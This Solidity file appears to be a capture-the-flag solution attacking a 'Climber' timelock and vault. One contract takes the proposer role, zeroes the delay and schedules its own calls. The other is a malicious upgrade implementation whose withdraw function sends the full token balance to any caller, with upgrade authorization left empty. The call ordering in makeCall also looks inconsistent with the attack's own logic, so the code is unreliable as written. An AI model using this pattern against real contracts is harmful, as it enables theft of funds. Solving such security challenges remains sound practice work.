//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface Timelock {
    function PROPOSER_ROLE() external returns (bytes32);

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberExploit {
    Timelock timelock;

    constructor(Timelock _timelock) {
        timelock = _timelock;
    }

    function start() public {
        address[] memory addressArgs = new address[](3);
        uint256[] memory uintArgs = new uint256[](3);
        bytes[] memory bytesArgs = new bytes[](3);
        bytes32 role = timelock.PROPOSER_ROLE();
        bytes memory signature1 = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            role,
            address(this)
        );
        bytes memory signature2 = abi.encodeWithSignature("updateDelay(uint64)", 0);
        bytes memory signature3 = abi.encodeWithSignature("start()");

        addressArgs[0] = address(timelock);
        addressArgs[1] = address(timelock);
        addressArgs[2] = address(this);
        uintArgs[0] = 0;
        uintArgs[1] = 0;
        uintArgs[2] = 0;
        bytesArgs[0] = signature1;
        bytesArgs[1] = signature2;
        bytesArgs[2] = signature3;

        timelock.schedule(addressArgs, uintArgs, bytesArgs, bytes32(0));
    }

    function makeCall(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) public {
        timelock.schedule(targets, values, dataElements, salt);
        timelock.execute(targets, values, dataElements, salt);
    }
}

contract ClimberProxyExploit is UUPSUpgradeable {
    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    function withdraw(address tokenAddress, address recipient) external {
        IERC20 token = IERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));
        require(token.transfer(recipient, balance), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
